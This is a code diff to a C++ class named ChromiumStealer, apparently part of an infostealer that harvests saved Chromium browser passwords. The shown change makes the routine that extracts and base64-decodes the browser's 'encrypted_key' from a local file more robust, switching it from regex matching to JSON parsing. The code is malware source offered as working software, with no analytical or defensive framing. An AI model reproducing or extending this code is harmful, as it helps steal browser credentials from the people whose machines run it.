@@ -17,6 +17,8 @@
 
 #include <openssl/evp.h>
 
+using json = nlohmann::json;
+
 class ChromiumStealer {
 public:
     struct password_data {
@@ -611,10 +613,12 @@ private:
 
         std::string contents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
 
-        std::vector<std::string> match_vector;
-        utils::string::match_regex(contents, "\"encrypted_key\":\"([^\"]+)\"", match_vector);
+        json json_contents = json::parse(contents);
+        if (!json_contents.contains("encrypted_key")) {
+            return false;
+        }
 
-        std::string encrypted_key = match_vector[0];
+        std::string encrypted_key = json_contents["encrypted_key"];
 
         std::string decoded64key;
         base64::decode(encrypted_key, decoded64key);
